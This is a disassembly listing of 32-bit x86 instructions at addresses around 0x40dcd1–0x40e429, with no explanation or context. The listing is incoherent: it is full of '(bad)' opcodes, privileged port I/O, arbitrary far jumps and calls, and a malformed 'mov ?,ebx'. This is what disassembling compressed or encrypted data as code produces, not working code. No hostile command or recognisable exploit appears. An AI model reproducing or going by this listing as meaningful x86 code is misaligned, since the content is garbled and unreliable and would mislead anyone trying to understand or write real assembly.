  40dcd1:	sbb    DWORD PTR [edi-0x41],esp
  40dcd4:	sbb    BYTE PTR [esp+ebx*4-0x33],0x24
  40dcd9:	inc    esp
  40dcda:	jl     0x40dcb1
  40dcdc:	mov    ebx,0x2daa7cb7
  40dce1:	scas   al,BYTE PTR es:[edi]
  40dce2:	add    ah,bl
  40dce4:	or     eax,0xf69b0eec
  40dce9:	retf   0x9cde
  40dcec:	aaa    
  40dced:	stos   DWORD PTR es:[edi],eax
  40dcee:	fbstp  TBYTE PTR [eax+edx*2]
  40dcf1:	out    0xdf,al
  40dcf3:	dec    esi
  40dcf4:	mov    ebp,0x89ecca34
  40dcf9:	popf   
  40dcfa:	and    edx,DWORD PTR [edx+0x5e0ba909]
  40dd00:	ins    DWORD PTR es:[edi],dx
  40dd01:	push   ds
  40dd02:	push   DWORD PTR [ebx+edx*4]
  40dd05:	xchg   edx,eax
  40dd06:	in     al,0x32
  40dd08:	hlt    
  40dd09:	pop    es
  40dd0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd0b:	and    bl,bh
  40dd0d:	adc    al,0x2b
  40dd0f:	shr    ah,0xf5
  40dd12:	cmp    DWORD PTR [edi-0xab03173],esi
  40dd18:	cwde   
  40dd19:	sbb    ah,BYTE PTR [ecx-0x790b9d0a]
  40dd1f:	sub    al,0x7
  40dd21:	inc    edi
  40dd22:	lahf   
  40dd23:	jle    0x40dd1a
  40dd25:	mov    ds:0x12cdbd24,al
  40dd2a:	es stc 
  40dd2c:	add    al,0x23
  40dd2e:	in     eax,0x2b
  40dd30:	hlt    
  40dd31:	xchg   ebp,eax
  40dd32:	imul   esi,DWORD PTR [edx],0x94113bcd
  40dd38:	sar    BYTE PTR [esi],cl
  40dd3a:	adc    eax,DWORD PTR [eax]
  40dd3c:	jo     0x40dcd6
  40dd3e:	repnz sti 
  40dd40:	push   edx
  40dd41:	ja     0x40dcde
  40dd43:	cmp    eax,0x6b22a92
  40dd48:	xor    al,0x40
  40dd4a:	leave  
  40dd4b:	rcl    DWORD PTR [esi],0xa8
  40dd4e:	add    eax,ebx
  40dd50:	cmp    ch,al
  40dd52:	test   eax,0xd9b7efde
  40dd57:	push   edx
  40dd58:	jmp    FWORD PTR [edi]
  40dd5a:	int3   
  40dd5b:	mov    edi,DWORD PTR [edx-0x5489cb5a]
  40dd61:	aam    0x91
  40dd63:	mov    esi,fs
  40dd65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd66:	in     eax,0xde
  40dd68:	dec    ebp
  40dd69:	cmp    eax,0x773d59c5
  40dd6e:	push   0xabb2ec0f
  40dd73:	xor    DWORD PTR [edx-0x71],eax
  40dd76:	aam    0x36
  40dd78:	mov    dh,dh
  40dd7a:	in     eax,0x5b
  40dd7c:	mov    DWORD PTR [edx+eax*2],ebx
  40dd7f:	cld    
  40dd80:	push   ds
  40dd81:	adc    dl,BYTE PTR [ecx+0x67]
  40dd84:	xchg   ecx,eax
  40dd85:	repnz push ebx
  40dd87:	inc    eax
  40dd88:	add    al,0x33
  40dd8a:	(bad)  
  40dd8b:	fwait
  40dd8c:	xchg   ecx,eax
  40dd8d:	adc    edx,ecx
  40dd8f:	xor    DWORD PTR [ecx+0x1e],edi
  40dd92:	push   0x9bb72b32
  40dd97:	sbb    BYTE PTR ds:0x423f51d7,bh
  40dd9d:	and    eax,0x314ee1b9
  40dda2:	or     cl,BYTE PTR [ebx+0xd]
  40dda5:	mov    eax,ds:0x5a5fb43a
  40ddaa:	xchg   esp,eax
  40ddab:	adc    esi,DWORD PTR [ecx-0x2f0f043e]
  40ddb1:	mov    ch,0x67
  40ddb3:	dec    esi
  40ddb4:	cmp    eax,0x68df5c65
  40ddb9:	lods   al,BYTE PTR ds:[esi]
  40ddba:	xchg   ecx,eax
  40ddbb:	jns    0x40ddc1
  40ddbd:	scas   eax,DWORD PTR es:[edi]
  40ddbe:	ins    DWORD PTR es:[di],dx
  40ddc0:	lock sbb ebp,esi
  40ddc3:	or     ecx,DWORD PTR [esi-0x60c0d601]
  40ddc9:	fdiv   QWORD PTR [edi+0x20407a5]
  40ddcf:	loop   0x40de33
  40ddd1:	mov    bh,0x33
  40ddd3:	(bad)  [ebp-0x7ef0b526]
  40ddd9:	and    DWORD PTR [ecx+ebp*4+0x1],0xda47130e
  40dde1:	xchg   edi,eax
  40dde2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dde3:	(bad)  
  40dde4:	sub    ebp,DWORD PTR [ecx]
  40dde6:	xchg   DWORD PTR [ecx],ecx
  40dde8:	pop    ecx
  40dde9:	cs jg  0x40ddd5
  40ddec:	(bad)  
  40dded:	ins    BYTE PTR es:[edi],dx
  40ddee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddef:	xchg   esp,eax
  40ddf0:	xor    DWORD PTR [ecx],0xffffffad
  40ddf3:	fsubr  DWORD PTR [eax+0x157d12ba]
  40ddf9:	xchg   DWORD PTR [edi-0x2c],esi
  40ddfc:	sub    al,0x7
  40ddfe:	shl    BYTE PTR [edi],1
  40de00:	pop    eax
  40de01:	ins    BYTE PTR es:[edi],dx
  40de02:	adc    eax,0x39910581
  40de07:	imul   edx,edi,0x7b
  40de0a:	seto   BYTE PTR [edx]
  40de0d:	dec    ecx
  40de0e:	inc    esi
  40de0f:	sbb    bh,BYTE PTR ds:0xbe711b73
  40de15:	push   esi
  40de16:	mov    edi,0xa60821fd
  40de1b:	sub    eax,0xf9b17bd7
  40de20:	and    dl,bh
  40de22:	out    0x35,eax
  40de24:	push   esi
  40de25:	aad    0xf0
  40de27:	inc    eax
  40de28:	jae    0x40de22
  40de2a:	add    BYTE PTR [ecx],ah
  40de2c:	bound  esp,QWORD PTR [edi]
  40de2e:	cdq    
  40de2f:	or     BYTE PTR [ebx-0x597f7847],ah
  40de35:	repnz sub al,0xbe
  40de38:	and    ch,BYTE PTR [ebx]
  40de3a:	aas    
  40de3b:	popa   
  40de3c:	mov    ebx,0xafd14727
  40de41:	rcr    DWORD PTR [edx+0x54182383],cl
  40de47:	ins    BYTE PTR es:[edi],dx
  40de48:	ret    
  40de49:	test   BYTE PTR [eax-0x2d],dh
  40de4c:	stos   DWORD PTR es:[edi],eax
  40de4d:	add    ebp,DWORD PTR [esi]
  40de4f:	xchg   esi,ebp
  40de51:	inc    esp
  40de52:	jo     0x40dded
  40de54:	test   BYTE PTR gs:[ecx+esi*4],cl
  40de58:	je     0x40de19
  40de5a:	jno    0x40de17
  40de5c:	sbb    al,0xd4
  40de5e:	ret    0x8038
  40de61:	or     eax,0xea87d933
  40de66:	or     esp,DWORD PTR [ebx]
  40de68:	retf   
  40de69:	(bad)  
  40de6a:	(bad)  
  40de6c:	push   ebx
  40de6d:	jmp    0x8d58:0x7e4bcad
  40de74:	mov    ch,0x37
  40de76:	dec    ebp
  40de77:	into   
  40de78:	cdq    
  40de79:	mov    DWORD PTR [ebx+0x3f],ecx
  40de7c:	add    BYTE PTR [ecx],cl
  40de7e:	ret    0x5632
  40de81:	cld    
  40de82:	dec    ecx
  40de83:	mov    cl,cl
  40de85:	rcr    DWORD PTR [ecx+0x17762e8],cl
  40de8b:	ret    
  40de8c:	add    DWORD PTR [edx+edi*4],ecx
  40de8f:	mov    ebp,0x2943435b
  40de94:	sti    
  40de95:	xchg   edi,eax
  40de96:	je     0x40decd
  40de98:	dec    esi
  40de99:	sbb    BYTE PTR [edx],0x80
  40de9c:	jbe    0x40de57
  40de9e:	(bad)  
  40de9f:	sbb    al,0xb
  40dea1:	push   0x5
  40dea3:	xor    BYTE PTR [ebp+0x72],0xf3
  40dea7:	sub    DWORD PTR [ecx+eax*2],edi
  40deaa:	xor    DWORD PTR [ecx+eax*2+0x7268867f],0x6df78536
  40deb5:	call   0xedd3c115
  40deba:	fs xchg edx,eax
  40debc:	xchg   esp,eax
  40debd:	cli    
  40debe:	mov    edx,0xd18dca15
  40dec3:	mov    BYTE PTR [eax],ch
  40dec5:	cmp    dh,0x6a
  40dec8:	aad    0xe8
  40deca:	push   edi
  40decb:	xchg   ebx,eax
  40decc:	imul   ebx,DWORD PTR [ebp+0x268ab4f0],0x63
  40ded3:	lods   al,BYTE PTR ds:[esi]
  40ded4:	bound  esp,QWORD PTR [ecx+0x75]
  40ded7:	push   esi
  40ded8:	in     al,0x4d
  40deda:	mov    esi,0x18a1134
  40dedf:	pop    ds
  40dee0:	pop    es
  40dee1:	(bad)  
  40dee2:	adc    eax,0xf794669
  40dee7:	jmp    0x40df57
  40dee9:	hlt    
  40deea:	stc    
  40deeb:	and    bl,BYTE PTR [ecx+0x6a347270]
  40def1:	scas   al,BYTE PTR es:[edi]
  40def2:	sbb    esi,DWORD PTR [ecx+0x27b339e7]
  40def8:	fsubrp st(3),st
  40defa:	xchg   ecx,eax
  40defb:	xchg   ebp,eax
  40defc:	xor    al,0xb6
  40defe:	bound  ebx,QWORD PTR [ebx+0x5f25c53f]
  40df04:	pop    esi
  40df05:	dec    esi
  40df06:	sub    ebp,eax
  40df08:	xor    al,0xa8
  40df0a:	jbe    0x40ded5
  40df0c:	xchg   DWORD PTR [ecx+eiz*2],ebx
  40df0f:	or     ah,cl
  40df11:	fwait
  40df12:	adc    dl,cl
  40df14:	and    ah,ah
  40df16:	push   ebx
  40df17:	(bad)  
  40df18:	popf   
  40df19:	jecxz  0x40df27
  40df1b:	jo     0x40df2c
  40df1d:	mul    DWORD PTR [eax]
  40df1f:	aaa    
  40df20:	loop   0x40deca
  40df22:	add    DWORD PTR [edi-0x23],eax
  40df25:	cmp    al,BYTE PTR [ebx]
  40df27:	and    DWORD PTR [esi+0x1cf9c0e0],eax
  40df2d:	adc    edi,0x25b45efd
  40df33:	xchg   ebx,eax
  40df34:	imul   ebp,edi,0x7a
  40df37:	add    BYTE PTR [edi],al
  40df39:	xchg   BYTE PTR ds:[edx+0x20],bh
  40df3d:	cmp    al,0x20
  40df3f:	ds jl  0x40df82
  40df42:	stos   BYTE PTR es:[edi],al
  40df43:	addr16 leave 
  40df45:	or     al,cl
  40df47:	jp     0x40df49
  40df49:	popa   
  40df4a:	test   eax,0xd35f737
  40df4f:	jmp    0x40df68
  40df51:	pop    ebp
  40df52:	xchg   ebp,eax
  40df53:	jge    0x40df92
  40df55:	sbb    DWORD PTR [ecx+eiz*2-0x773d0fbd],esi
  40df5c:	gs jne 0x40df3d
  40df5f:	and    ebp,ecx
  40df61:	retf   
  40df62:	fwait
  40df63:	imul   ecx,DWORD PTR [eax],0x61
  40df66:	int    0xd4
  40df68:	cmp    esp,DWORD PTR [edi]
  40df6a:	cmp    ecx,DWORD PTR ds:0x44b3b21f
  40df70:	mov    bl,0xb1
  40df72:	sub    DWORD PTR [ebp-0x269aa88a],eax
  40df78:	cld    
  40df79:	xchg   ecx,eax
  40df7a:	and    DWORD PTR [ebx+0x3768cff5],0x402d844a
  40df84:	mov    ?,ebx
  40df86:	mov    ebx,0xc59f1497
  40df8b:	dec    edi
  40df8c:	jl     0x40df82
  40df8e:	(bad)  
  40df90:	mov    ds:0xee439125,al
  40df95:	push   es
  40df96:	das    
  40df97:	call   0x489e:0x39b4040d
  40df9e:	adc    al,0xe
  40dfa0:	sti    
  40dfa1:	pop    ebx
  40dfa2:	mov    DWORD PTR [ecx+0x38],0xd71a3bbc
  40dfa9:	sub    eax,0x370fd8fe
  40dfae:	in     al,0xfa
  40dfb0:	mov    ch,0xc9
  40dfb2:	ficom  WORD PTR [ebp-0x62]
  40dfb5:	mov    DWORD PTR [ebp-0x3e],0x9d47e1fb
  40dfbc:	popf   
  40dfbd:	mov    cl,0xb4
  40dfbf:	(bad)  
  40dfc0:	loope  0x40dfeb
  40dfc2:	fidivr DWORD PTR [edx+0x3e]
  40dfc5:	inc    edx
  40dfc6:	das    
  40dfc7:	out    0xce,al
  40dfc9:	(bad)  
  40dfca:	adc    al,BYTE PTR [edx+0x3a]
  40dfcd:	ss das 
  40dfcf:	add    al,0x67
  40dfd1:	inc    edi
  40dfd2:	adc    BYTE PTR [eax-0x5a57dc0b],dh
  40dfd8:	popa   
  40dfd9:	xor    bh,dl
  40dfdb:	daa    
  40dfdc:	test   eax,0x271751c2
  40dfe1:	push   ecx
  40dfe2:	xchg   BYTE PTR ds:0x87601be5,dh
  40dfe8:	mov    ebp,0x83534e4d
  40dfed:	sub    edi,DWORD PTR [ebp-0x76]
  40dff0:	sbb    BYTE PTR [edx+0x64],dl
  40dff3:	nop
  40dff4:	in     eax,0xd0
  40dff6:	mov    bl,0x3d
  40dff8:	or     bl,BYTE PTR [eax-0x7b]
  40dffb:	out    0x6f,al
  40dffd:	xchg   ecx,eax
  40dffe:	add    cl,bh
  40e000:	retf   
  40e001:	mov    WORD PTR [ebx+0x57ca0daa],ds
  40e007:	(bad)  
  40e008:	out    dx,eax
  40e009:	xchg   ebx,eax
  40e00a:	scas   eax,DWORD PTR es:[edi]
  40e00b:	bound  edx,QWORD PTR [ecx]
  40e00d:	push   edx
  40e00e:	jmp    0x6e84:0x42e7d5ac
  40e015:	push   cs
  40e016:	xor    DWORD PTR [ebp-0x7c],0xa7503a5d
  40e01d:	sar    DWORD PTR [ebp+0x263e5c1],1
  40e023:	mov    bl,0x35
  40e025:	aad    0x8
  40e027:	or     DWORD PTR [edi+0x103fb50],0xcc0f9143
  40e031:	jb     0x40e065
  40e033:	push   esi
  40e034:	sbb    BYTE PTR [eax-0xca01782],0x90
  40e03b:	inc    esp
  40e03c:	ins    BYTE PTR es:[edi],dx
  40e03d:	jo     0x40e06b
  40e03f:	rcr    bl,cl
  40e041:	pop    esi
  40e042:	fsub   st(2),st
  40e044:	adc    al,0x52
  40e046:	pusha  
  40e047:	pusha  
  40e048:	mov    bh,0x41
  40e04a:	fldenv [ebp-0x22042d77]
  40e050:	lock jnp 0x40dfe8
  40e053:	dec    edx
  40e054:	xor    DWORD PTR [ebx-0x12],0xffffffc4
  40e058:	push   ss
  40e059:	cmc    
  40e05a:	push   esi
  40e05b:	push   es
  40e05c:	fstp   QWORD PTR [esi+0x16]
  40e05f:	xchg   edx,eax
  40e060:	dec    ecx
  40e061:	mov    bh,BYTE PTR [edi]
  40e063:	fwait
  40e064:	push   ebp
  40e065:	out    dx,al
  40e066:	iret   
  40e067:	mov    ecx,0x38cf8913
  40e06c:	push   ss
  40e06d:	retf   
  40e06e:	add    bl,dl
  40e070:	mov    dh,0x4d
  40e072:	mov    WORD PTR [ebx],es
  40e074:	xchg   esp,eax
  40e075:	cwde   
  40e076:	rol    BYTE PTR [eax+ebx*4-0x3ae844e3],1
  40e07d:	into   
  40e07e:	dec    ebx
  40e07f:	mul    BYTE PTR [esi-0x33]
  40e082:	add    esp,ebp
  40e084:	add    DWORD PTR [ebp+0x12],esp
  40e087:	out    dx,al
  40e088:	cmp    al,BYTE PTR ds:0x40204789
  40e08e:	dec    ebx
  40e08f:	or     edi,DWORD PTR [ecx+0x58]
  40e092:	popf   
  40e093:	dec    ebp
  40e094:	shr    BYTE PTR [ecx],1
  40e096:	mov    dh,0x3c
  40e098:	mov    dl,0x28
  40e09a:	pop    edx
  40e09b:	and    al,0xae
  40e09d:	sub    ecx,DWORD PTR [eax+ebp*2+0x12]
  40e0a1:	int3   
  40e0a2:	jg     0x40e050
  40e0a4:	neg    BYTE PTR [esi-0x11]
  40e0a7:	cmp    dl,BYTE PTR ds:0x9309091f
  40e0ad:	fdivrp st(0),st
  40e0af:	call   0x50c8:0x68fd879a
  40e0b6:	(bad)  
  40e0b7:	loop   0x40e082
  40e0b9:	xchg   ebp,eax
  40e0ba:	loop   0x40e0d2
  40e0bc:	das    
  40e0bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0be:	repz sbb bl,0xdd
  40e0c2:	retf   
  40e0c3:	jmp    0x59029dfd
  40e0c8:	dec    edi
  40e0c9:	mov    ds:0x72abe209,eax
  40e0ce:	stc    
  40e0cf:	adc    al,0x45
  40e0d1:	rol    BYTE PTR [ecx-0x609ffde9],cl
  40e0d7:	xchg   ebp,eax
  40e0d8:	call   0xa768:0x41d1050f
  40e0df:	loop   0x40e08d
  40e0e1:	pop    esi
  40e0e2:	aas    
  40e0e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0e4:	(bad)
  40e0e8:	repnz xchg ecx,ebp
  40e0eb:	add    eax,0xb5ebb822
  40e0f0:	test   al,0x60
  40e0f2:	scas   al,BYTE PTR es:[edi]
  40e0f3:	mov    al,ds:0xb63bfe80
  40e0f8:	loop   0x40e129
  40e0fa:	ret    0x5f84
  40e0fd:	sahf   
  40e0fe:	cmp    DWORD PTR [esi+edi*4+0x8],0xffffff9e
  40e103:	xchg   ebx,eax
  40e104:	aaa    
  40e105:	sub    al,0x82
  40e107:	jbe    0x40e169
  40e109:	aad    0xb7
  40e10b:	ins    BYTE PTR es:[edi],dx
  40e10c:	pop    edi
  40e10d:	cmp    BYTE PTR [ebx+esi*8],cl
  40e110:	jp     0x40e0a3
  40e112:	jnp    0x40e102
  40e114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e115:	cmp    DWORD PTR [ecx+edi*2+0xca6a681],eax
  40e11c:	mov    ebp,0xf0975974
  40e121:	dec    ebx
  40e122:	out    0xfb,al
  40e124:	add    edx,DWORD PTR [ebp-0x14]
  40e127:	dec    edi
  40e128:	mov    ecx,0xd4d1237b
  40e12d:	into   
  40e12e:	stos   DWORD PTR es:[edi],eax
  40e12f:	imul   edx,DWORD PTR [edi+0x70af1f2],0x5dc2f89d
  40e139:	retf   0x7d99
  40e13c:	jmp    0x40e15c
  40e13e:	pop    edi
  40e13f:	int    0xee
  40e141:	out    dx,al
  40e142:	mov    eax,ds:0x3b6f5965
  40e147:	stos   DWORD PTR es:[edi],eax
  40e148:	in     al,dx
  40e149:	inc    ebp
  40e14a:	mov    ah,0xfe
  40e14c:	mov    cl,BYTE PTR [edi-0x686179c2]
  40e152:	popa   
  40e153:	cmp    BYTE PTR [edi+0x15ac93f2],bh
  40e159:	inc    ebp
  40e15a:	lds    esi,FWORD PTR [eax]
  40e15c:	sub    al,0x15
  40e15e:	mov    DWORD PTR [ecx],esp
  40e160:	outs   dx,DWORD PTR ds:[esi]
  40e161:	pushf  
  40e162:	call   0xe9ef:0xdd5d85b2
  40e169:	jmp    0x9ad518c9
  40e16e:	pop    ecx
  40e16f:	sub    eax,DWORD PTR [ebx-0x6b55113a]
  40e175:	sub    esi,edx
  40e177:	mov    bh,0xba
  40e179:	data16 sti 
  40e17b:	pusha  
  40e17c:	xchg   ebp,eax
  40e17d:	cmp    al,0x9b
  40e17f:	jl     0x40e10e
  40e181:	xor    eax,edx
  40e183:	jecxz  0x40e196
  40e185:	stc    
  40e186:	jbe    0x40e119
  40e188:	scas   al,BYTE PTR es:[edi]
  40e189:	hlt    
  40e18a:	jns    0x40e14d
  40e18c:	in     eax,0xee
  40e18e:	stos   BYTE PTR es:[edi],al
  40e18f:	jmp    0x40e16b
  40e191:	aad    0x5c
  40e193:	inc    ebp
  40e194:	mov    ah,0x6e
  40e196:	sbb    al,0x98
  40e198:	dec    ebp
  40e199:	int3   
  40e19a:	cmp    ecx,DWORD PTR [ecx]
  40e19c:	iret   
  40e19d:	cli    
  40e19e:	sbb    edx,DWORD PTR [ebx]
  40e1a0:	test   DWORD PTR [ebx*2+0xf24f9d6],ebp
  40e1a7:	fidiv  WORD PTR [eax+eax*1]
  40e1aa:	sti    
  40e1ab:	sahf   
  40e1ac:	add    DWORD PTR [eax-0x2f7c549b],ebp
  40e1b2:	xchg   DWORD PTR [ebx-0x4ff19e2c],ebp
  40e1b8:	jle    0x40e1ac
  40e1ba:	or     edx,esi
  40e1bc:	loop   0x40e204
  40e1be:	imul   ebp,edx,0xffffff9b
  40e1c1:	add    ch,BYTE PTR [ecx]
  40e1c3:	hlt    
  40e1c4:	mov    eax,ds:0x2a95b96c
  40e1c9:	popf   
  40e1ca:	and    dh,ah
  40e1cc:	(bad)  
  40e1cd:	jbe    0x40e1ea
  40e1cf:	out    0x87,eax
  40e1d1:	jmp    0xf6ba:0xefddd65d
  40e1d8:	sub    eax,0xbda21f1e
  40e1dd:	sbb    DWORD PTR ss:[esi],esi
  40e1e0:	aad    0xd1
  40e1e2:	pusha  
  40e1e3:	sbb    al,0x4b
  40e1e5:	mov    ebx,0x8aa5d363
  40e1ea:	mov    ds:0x145303a3,al
  40e1ef:	pop    es
  40e1f0:	(bad)  
  40e1f1:	into   
  40e1f2:	sbb    al,0xed
  40e1f4:	psubw  mm6,mm0
  40e1f7:	ds mov esi,0xa3feb4c2
  40e1fd:	pop    ebp
  40e1fe:	repz bound ebx,QWORD PTR [esi]
  40e201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e202:	jp     0x40e19f
  40e204:	sub    BYTE PTR [esi],0xee
  40e207:	cs icebp 
  40e209:	in     al,dx
  40e20a:	dec    edx
  40e20b:	jnp    0x40e1ef
  40e20d:	test   DWORD PTR ds:0x5d31f937,0xb41e844e
  40e217:	inc    ecx
  40e218:	mov    dh,BYTE PTR [edi]
  40e21a:	dec    ebx
  40e21b:	push   ds
  40e21c:	int    0x2a
  40e21e:	sahf   
  40e21f:	fstp   DWORD PTR [ecx-0x3e]
  40e222:	inc    BYTE PTR [edx-0x11b9f90]
  40e228:	mov    al,0xf2
  40e22a:	inc    edi
  40e22b:	push   edx
  40e22c:	cli    
  40e22d:	dec    ebp
  40e22e:	pop    ecx
  40e22f:	clc    
  40e230:	cmp    al,0xac
  40e232:	arpl   WORD PTR [edx-0x4b756dde],sp
  40e238:	and    dl,BYTE PTR [edx-0x58]
  40e23b:	repz mov dh,BYTE PTR [edx]
  40e23e:	xor    esp,edi
  40e240:	sub    cl,dl
  40e242:	pop    ebp
  40e243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e244:	sbb    bl,BYTE PTR [eax]
  40e246:	fadd   QWORD PTR [eax+0x917cee5]
  40e24c:	clc    
  40e24d:	icebp  
  40e24e:	inc    esi
  40e24f:	push   eax
  40e250:	mov    al,ds:0xd718dc49
  40e255:	jnp    0x40e237
  40e257:	aad    0x1b
  40e259:	int    0x6
  40e25b:	push   esi
  40e25c:	ror    ebp,cl
  40e25e:	or     ah,BYTE PTR [edx+0x2f1ff187]
  40e264:	cdq    
  40e265:	xchg   ecx,eax
  40e266:	mov    ch,BYTE PTR [edx+0x141b7da]
  40e26c:	in     al,dx
  40e26d:	push   edi
  40e26e:	push   ebx
  40e26f:	nop
  40e270:	mov    esi,0x1c8d4f4b
  40e275:	imul   BYTE PTR [esi]
  40e277:	mov    dl,0x54
  40e279:	not    BYTE PTR [ecx]
  40e27b:	jmp    0x8bb:0xb62223c6
  40e282:	repz jbe 0x40e258
  40e285:	fild   QWORD PTR [esi]
  40e287:	mov    WORD PTR [ebx+0x62],ss
  40e28a:	fidivr WORD PTR [edi]
  40e28c:	das    
  40e28d:	addr16 jns 0x40e2a3
  40e290:	push   edx
  40e291:	cmp    eax,0xd6180200
  40e296:	addr16 imul edi,esp,0xf411dd20
  40e29d:	adc    eax,0x1b37598e
  40e2a2:	hlt    
  40e2a3:	mov    ebx,0x3bacac3f
  40e2a8:	retf   
  40e2a9:	ret    
  40e2aa:	into   
  40e2ab:	and    eax,0xb34e8819
  40e2b0:	stc    
  40e2b1:	inc    esp
  40e2b2:	clc    
  40e2b3:	stc    
  40e2b4:	(bad)  
  40e2b5:	mov    bh,0x84
  40e2b7:	addr16 mov ebx,0x1de3f968
  40e2bd:	sbb    DWORD PTR [ebx-0x7c],esi
  40e2c0:	mov    dh,0xe7
  40e2c2:	mov    ch,0x57
  40e2c4:	pop    es
  40e2c5:	(bad)  
  40e2c6:	mov    ah,0x9f
  40e2c8:	ins    DWORD PTR es:[edi],dx
  40e2c9:	xchg   ebx,eax
  40e2ca:	adc    edx,DWORD PTR [edx]
  40e2cc:	push   0x7b4a7586
  40e2d1:	sbb    eax,0x6c513d31
  40e2d6:	mov    esp,0x4b7cf986
  40e2db:	gs pushf 
  40e2dd:	lds    edi,FWORD PTR [esi+eax*4]
  40e2e0:	(bad)  
  40e2e1:	(bad)  
  40e2e3:	cdq    
  40e2e4:	jae    0x40e2fc
  40e2e6:	lea    esi,[ebx]
  40e2e8:	dec    eax
  40e2e9:	ret    
  40e2ea:	dec    esp
  40e2eb:	test   DWORD PTR [edi+0x7bb6806d],esp
  40e2f1:	mov    ebx,edi
  40e2f3:	xchg   ecx,eax
  40e2f4:	inc    ebx
  40e2f5:	pop    esp
  40e2f6:	jp     0x40e2be
  40e2f8:	pusha  
  40e2f9:	mov    ebp,0x46c5eb64
  40e2fe:	cmp    eax,0x5838315c
  40e303:	pop    edx
  40e304:	ret    
  40e305:	das    
  40e306:	adc    eax,0xc0532499
  40e30b:	cmp    DWORD PTR [edi+0x450a84f9],esp
  40e311:	jecxz  0x40e359
  40e313:	rol    dh,cl
  40e315:	jne    0x40e364
  40e317:	mov    bl,0x33
  40e319:	inc    BYTE PTR [edi+0x1a]
  40e31c:	in     eax,dx
  40e31d:	rol    edi,1
  40e31f:	push   cs
  40e320:	aas    
  40e321:	(bad)  
  40e322:	pop    esp
  40e323:	jo     0x40e318
  40e325:	stos   DWORD PTR es:[edi],eax
  40e326:	jbe    0x40e300
  40e328:	add    esp,DWORD PTR [ebx]
  40e32a:	sbb    eax,0x26768f7
  40e32f:	sti    
  40e330:	sbb    edi,esi
  40e332:	jmp    0xd0ce:0x87ccf9d2
  40e339:	xor    esi,edi
  40e33b:	sub    dh,dl
  40e33d:	bound  edi,QWORD PTR [esi]
  40e33f:	fistp  WORD PTR [ebp+0x70e9c626]
  40e345:	mov    ch,0x30
  40e347:	mov    cl,0x57
  40e349:	sti    
  40e34a:	inc    esi
  40e34b:	pop    ecx
  40e34c:	sub    al,0xcc
  40e34e:	sti    
  40e34f:	ss pop ss
  40e351:	add    esp,DWORD PTR [esp+edx*1]
  40e354:	fwait
  40e355:	mov    ch,0xf5
  40e357:	lahf   
  40e358:	std    
  40e359:	js     0x40e321
  40e35b:	pop    ds
  40e35c:	xchg   DWORD PTR [ecx+eiz*1+0x7d],ebx
  40e360:	mov    DWORD PTR [ecx],edi
  40e362:	int3   
  40e363:	leave  
  40e364:	rcr    BYTE PTR [esp+ebx*2],0x8d
  40e368:	idiv   BYTE PTR [edx+0x2c]
  40e36b:	pop    ecx
  40e36c:	dec    eax
  40e36d:	pop    esi
  40e36e:	adc    al,0x3a
  40e370:	pop    eax
  40e371:	xchg   esp,eax
  40e372:	xchg   edi,eax
  40e373:	cs jecxz 0x40e3c2
  40e376:	loopne 0x40e320
  40e378:	sub    al,0x1b
  40e37a:	sub    BYTE PTR [ecx+0x57d2de12],dh
  40e380:	outs   dx,BYTE PTR ds:[esi]
  40e381:	out    dx,al
  40e382:	sub    DWORD PTR [ebx+0x2b],ecx
  40e385:	jne    0x40e3a8
  40e387:	adc    cl,ah
  40e389:	mov    eax,0xb42a3e17
  40e38e:	pop    eax
  40e38f:	adc    al,0x63
  40e391:	pop    ss
  40e392:	xchg   ebp,eax
  40e393:	outs   dx,BYTE PTR ds:[esi]
  40e394:	sbb    eax,ebx
  40e396:	cmp    cl,BYTE PTR [ecx-0x24daad1d]
  40e39c:	rcl    BYTE PTR [edx],0xaf
  40e39f:	pushf  
  40e3a0:	lods   al,BYTE PTR ds:[esi]
  40e3a1:	dec    esi
  40e3a2:	jno    0x40e3a1
  40e3a4:	in     eax,dx
  40e3a5:	lods   al,BYTE PTR ds:[esi]
  40e3a6:	sbb    al,BYTE PTR [ecx]
  40e3a8:	inc    edi
  40e3a9:	dec    DWORD PTR [eax-0x11a3e0]
  40e3af:	sub    al,0xc3
  40e3b1:	or     eax,0xb5762d64
  40e3b6:	or     BYTE PTR [ebp+0x6c],cl
  40e3b9:	(bad)  
  40e3bb:	add    eax,0xa48d40a4
  40e3c0:	lods   eax,DWORD PTR ds:[esi]
  40e3c1:	jae    0x40e36b
  40e3c3:	add    BYTE PTR [ebx+ebx*4+0x31],dl
  40e3c7:	dec    edx
  40e3c8:	in     al,0x7d
  40e3ca:	test   BYTE PTR [ebp+0x6a],bl
  40e3cd:	ret    0xbf27
  40e3d0:	in     al,0x8d
  40e3d2:	leave  
  40e3d3:	inc    esi
  40e3d4:	jmp    0xb749763b
  40e3d9:	(bad)
  40e3dc:	jmp    0xe1ebe3c1
  40e3e1:	sbb    al,0x3d
  40e3e3:	stos   BYTE PTR es:[edi],al
  40e3e4:	xchg   dl,bl
  40e3e6:	cmp    DWORD PTR [ecx],ebp
  40e3e8:	jae    0x40e381
  40e3ea:	in     al,dx
  40e3eb:	ret    
  40e3ec:	jb     0x40e37d
  40e3ee:	cld    
  40e3ef:	retf   0x2960
  40e3f2:	adc    cl,BYTE PTR [eax-0x420d101b]
  40e3f8:	inc    eax
  40e3f9:	bound  edi,QWORD PTR [ebx]
  40e3fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3fc:	mov    BYTE PTR [edx+eiz*8],0x19
  40e400:	adc    dh,al
  40e402:	xlat   BYTE PTR ds:[ebx]
  40e403:	and    al,0x16
  40e405:	jmp    0x3c6:0x670cec6c
  40e40c:	xchg   edx,eax
  40e40d:	add    edx,ecx
  40e40f:	jmp    0x495f89e2
  40e414:	bound  esp,QWORD PTR [esi+0x28]
  40e417:	cmp    BYTE PTR [ebx-0x80],bh
  40e41a:	jmp    0x40e3bd
  40e41c:	push   edi
  40e41d:	jle    0x40e3e8
  40e41f:	jl     0x40e497
  40e421:	adc    esi,DWORD PTR [edi+0x17]
  40e424:	leave  
  40e425:	pop    edx
  40e426:	aas    
  40e427:	cmp    eax,ebp
  40e429:	out    dx,al
